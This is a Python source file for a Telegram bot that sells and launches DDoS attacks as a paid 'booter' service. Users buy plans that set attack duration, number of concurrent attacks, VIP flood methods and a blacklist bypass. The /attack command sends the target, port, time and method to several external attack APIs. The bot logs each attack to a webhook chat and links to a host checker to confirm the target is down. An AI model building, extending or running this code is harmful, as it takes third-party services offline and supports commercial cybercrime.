from telegram import Update, InlineKeyboardMarkup, InlineKeyboardButton
from telegram.ext import ApplicationBuilder, CommandHandler, InlineQueryHandler, ContextTypes, CallbackQueryHandler, CallbackContext
from uuid import uuid4
import json
from datetime import datetime, timedelta
import asyncio
import aiohttp
from yarl import URL
import httpx

BOT_TOKEN = "BOT TOKEN"
apis = [
    "https://your_api/api1/attack?user=&key=&host={host}&port={port}&time={time}&method={method}",
    "https://your_api/api2/attack?user=&key=&host={host}&port={port}&time={time}&method={method}",
    "https://your_api/api3/attack?user=&key=&host={host}&port={port}&time={time}&method={method}"
]


ADMIN_IDS = [5145402317, 87654321] #SET YOUR ADMIN IDS HERE
from functions import ban_user, unban_user, blacklist_command,running_command,method_command,list_banned,plan,start

async def send_to_webhook(full_name, url, time, port, method):
  bot_token = "WEBHOOK BOT TOKEN"
  chat_id = "ID WEBHOOK GROUP CHAT" 
  text = (
      f"```\n"
      f"User: {full_name}\n"
      f"Url: {url}\n"
      f"Time: {time}s\n"
      f"Port: {port}\n"
      f"Method: {method}\n"
      f"```"
  )

  url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
  payload = {
      "chat_id": chat_id,
      "text": text,
      "parse_mode": "MarkdownV2"
  }

  async with httpx.AsyncClient() as client:
      try:
          response = await client.post(url, json=payload)
          response.raise_for_status()
      except httpx.HTTPStatusError as e:
          print(f"HTTP error occurred: {e}")  
      except httpx.RequestError as e:
          print(f"Request error occurred: {e}") 


async def call_api(target, time, port, method, apis):
    async with aiohttp.ClientSession() as session:
        for api_template in apis:
            api_url = None
            try:
                api_url = api_template.format(host=target, port=port, time=time, method=method)
                async with session.get(api_url) as response:
                    response.raise_for_status()
            except aiohttp.ClientResponseError as e:
                print(f"HTTP error occurred at {api_url}: {e}")
            except aiohttp.ClientError as e:
                print(f"Request error occurred at {api_url}: {e}")
            except Exception as e:
                print(f"An error occurred at {api_url}: {e}")
    return
      

async def add_user(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        return

    args = context.args
    if len(args) != 7:
        await update.message.reply_text("Usage: /add [id] [time] [concurrent] [expire_in_days] [vip] [bypass blacklist] [cooldown_in_seconds]\nExample:<code> /add 5145402317 300 5 60 true false 29</code>", parse_mode='HTML')
        return

    user_id, time, concurrent, expire_in_days, vip, bypass_blacklist, cooldown = args
    try:
        time = int(time)
        concurrent = int(concurrent)
        expire_in_days = int(expire_in_days)
        cooldown = int(cooldown)
        vip = True if vip.lower() == 'true' else False
        bypass_blacklist = True if bypass_blacklist.lower() == 'true' else False

        expire_datetime = datetime.utcnow() + timedelta(days=expire_in_days)
        expire_iso = expire_datetime.isoformat()

        with open('users.json', 'r+') as file:
            users = json.load(file)
            users[user_id] = {
                "time": time,
                "concurrent": concurrent,
                "vip": vip,
                "expire": expire_iso,
                "banned": False,
                "bypass_blacklist": bypass_blacklist,
                "cooldown": cooldown,
                "last_attack": None  
            }
            file.seek(0)
            json.dump(users, file, indent=4)
            file.truncate()

        await update.message.reply_text(f"User <code>{user_id}</code> added/updated with | Time={time} | Concurrent={concurrent} | VIP={vip} | Bypass blacklist={bypass_blacklist} | Cooldown={cooldown}s | Expires on {expire_iso}", parse_mode="HTML")

    except ValueError:
        await update.message.reply_text("Error: Ensure that all parameters are correctly formatted.")

    

def load_methods():
  with open('methods.json', 'r') as file:
      return json.load(file)

def load_user_plans():
  with open('users.json', 'r') as file:
      return json.load(file)


async def handle_attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    user_plans = load_user_plans()
    user_plan = user_plans.get(str(user_id))

    if not user_plan or datetime.now() > datetime.fromisoformat(user_plan['expire']):
        await update.message.reply_text("Your Plan does not exist\nContact <b>@daviinci_b</b> for buying Plan",parse_mode="HTML")
        return

    if user_plan.get('banned', False):
        await update.message.reply_text("You are banned from using Davinci service")
        return

    args = context.args
    if len(args) != 4:
        await update.message.reply_text("Usage: /attack [target] [port] [time] [method]\nE.g: <code> /attack http://example.com/ 80 60 HTTP-FLOOD</code>",parse_mode="HTML")
        return

    target, port, time, method_name = args
    try:
        time = int(time)
        port = int(port)
    except ValueError:
        await update.message.reply_text("'time' and 'port' values must be numbers.")
        return

    if time > user_plan['time']:
        await update.message.reply_text(f"Your Plan: <b>{user_plan['time']}s</b>",parse_mode="HTML")
        return

    running_attacks_count = count_running_attacks(user_id)
    conc = user_plan['concurrent']
    if running_attacks_count >= int(conc):
        await update.message.reply_text(f"Your Running: <b>{running_attacks_count}/{conc}</b>",parse_mode="HTML")
        return

    current_time = datetime.utcnow()
    last_attack_time = datetime.fromisoformat(user_plan.get('last_attack')) if user_plan.get('last_attack') else None
    cooldown_period = timedelta(seconds=user_plan['cooldown'])

    if last_attack_time and current_time - last_attack_time < cooldown_period:
        remaining_cooldown = cooldown_period - (current_time - last_attack_time)
        await update.message.reply_text(f"Please wait {remaining_cooldown.total_seconds():.0f} second before performing another attack")
        return

    with open('blacklist.json', 'r') as file:
        blacklist = json.load(file)

    is_vip = user_plan.get('vip', False)
    
    if any(blacklisted in target for blacklisted in blacklist) or target.endswith('.gov') or target.endswith('.edu'):
        if not user_plan.get('bypass_blacklist', False):
            await update.message.reply_text(f"Target <b>{target}</b> is blacklisted", parse_mode="HTML")
            return
    
    methods = load_methods()
    method = next((m for m in methods if m['name'] == method_name), None)
    if not method:
        await update.message.reply_text("Invalid attack method")
        return

    if method['vip'] and not is_vip:
        await update.message.reply_text(f"Method <b>{method_name}</b> is available only for VIP users", parse_mode="HTML")
        return

    full_name = update.effective_user.full_name
    attack_id = await start_attack(user_id, target, time, port, method_name)
    check_host_url = f"https://check-host.net/check-http?host={target}"
    button = InlineKeyboardButton(text="Check Host 🔎", url=check_host_url)
    markup = InlineKeyboardMarkup([[button]])
    await call_api(target, time, port, method_name, apis)
    await send_to_webhook(full_name, target, time, port, method_name)

    user_plans[str(user_id)]['last_attack'] = current_time.isoformat()
    with open('users.json', 'w') as file:
        json.dump(user_plans, file, indent=4)


    running_attacks = count_running_attacks(user_id)

    await update.message.reply_text(
        f"<code>Attack on </code><b>{target}</b><code> use {method_name} in {time} second on port {port} started\nRunning: {running_attacks}/{conc}</code>",
        parse_mode='HTML',
        reply_markup=markup
    )
      



async def start_attack(user_id, url, time, port, method_name):
    with open('running.json', 'r+') as file:
        try:
            running_attacks = json.load(file)
        except json.JSONDecodeError:
            running_attacks = {}

        end_time = datetime.utcnow() + timedelta(seconds=int(time))
        attack_id = str(uuid4())

        running_attacks[attack_id] = {
            "user_id": user_id,
            "url": url,
            "time": time,
            "port": port,
            "method_name": method_name,
            "end_time": end_time.isoformat()
        }

        file.seek(0)
        json.dump(running_attacks, file, indent=4)
        file.truncate()

    asyncio.create_task(end_attack(attack_id, time))

    return attack_id

async def end_attack(attack_id, delay):
  await asyncio.sleep(int(delay))
  with open('running.json', 'r+') as file:
      running_attacks = json.load(file)
      if attack_id in running_attacks:
          del running_attacks[attack_id]

      file.seek(0)
      json.dump(running_attacks, file, indent=4)
      file.truncate()


def count_running_attacks(user_id):
  with open('running.json', 'r') as file:
      try:
          running_attacks = json.load(file)
      except json.JSONDecodeError:
          return 0  

      current_time = datetime.utcnow()
      count = 0
      for attack in running_attacks.values():
          if attack['user_id'] == user_id and datetime.fromisoformat(attack['end_time']) > current_time:
              count += 1

      return count


def load_plans():
    with open('plan.json', 'r') as file:
        return json.load(file)['plans']


async def buy(update: Update, context: CallbackContext) -> None:
    plans = load_plans()
    current_plan = plans[0]  


    message = (
        "🛒 <b>Shop</b>\n\n"
        "Welcome to our shop\n\n"
        "Please choose an option below 👇"
    )

    keyboard = [
        [
            InlineKeyboardButton("<<", callback_data=str(plans[-1]['id'])),
            InlineKeyboardButton(f"0/{len(plans)}", callback_data="current"),
            InlineKeyboardButton(">>", callback_data=str(plans[0]['id']))
        ]
    ]

    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(message, reply_markup=reply_markup, parse_mode="HTML")

async def plan_callback(update: Update, context: CallbackContext) -> None:
    query = update.callback_query
    if not query:
        return
    await query.answer()
    plans = load_plans()
    plan_id = int(query.data)

    current_index = next((index for index, plan in enumerate(plans) if plan['id'] == plan_id), None)
    next_index = (current_index + 1) % len(plans)
    prev_index = (current_index - 1) % len(plans)


    keyboard = [
        [
            InlineKeyboardButton("<<", callback_data=str(plans[prev_index]['id'])),
            InlineKeyboardButton(f"{current_index + 1}/{len(plans)}", callback_data=str(current_index)),
            InlineKeyboardButton(">>", callback_data=str(plans[next_index]['id']))
        ],
        [
            InlineKeyboardButton("💬 Buy this Plan", url="https://t.me/daviinci_b")
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    details = plans[current_index]['details']
    
    expire_date = datetime.utcnow() + timedelta(days=int(details['Expires']))
    formatted_expire_date = expire_date.strftime("%d/%m/%Y")

    message = (
        f"🛒 <b>Shop</b>\n\n"
        f"🎖 <b>Plan:</b> <code>{plans[current_index]['name']}</code>\n\n"
        f"⌛ <b>Time:</b> <code>{details['Time']}</code>\n\n"
        f"💥 <b>Concurrent:</b> <code>{details['Concurrent']}</code>\n\n"
        f"⚜️ <b>VIP:</b> {details['VIP']}\n\n"
        f"📅 <b>Expiration:</b> <code>{details['Expires']} days</code><b> ({formatted_expire_date})</b>\n\n"
        f"🔓 <b>Bypass Blacklist:</b> {details['Bypass Blacklist']}\n\n"
        f"⏰ <b>Cooldown:</b> <code>{details['Cooldown']}</code>\n\n"
        f"💵 <b>Price:</b> <code>${details['Price']}</code>"
    )

    await query.edit_message_text(text=message, reply_markup=reply_markup,parse_mode="HTML")



app = ApplicationBuilder().token(BOT_TOKEN).build()


app.add_handler(CommandHandler("attack", handle_attack_command))
app.add_handler(CommandHandler("bl", blacklist_command))
app.add_handler(CommandHandler("add", add_user))
app.add_handler(CommandHandler("ban", ban_user))
app.add_handler(CommandHandler("unban", unban_user))
app.add_handler(CommandHandler("running", running_command))
app.add_handler(CommandHandler("method", method_command))
app.add_handler(CommandHandler("listban", list_banned))
app.add_handler(CommandHandler("plan", plan))
app.add_handler(CommandHandler("start", start))
app.add_handler(CommandHandler("buy", buy))
app.add_handler(CallbackQueryHandler(plan_callback))
print("Running...")
app.run_polling()
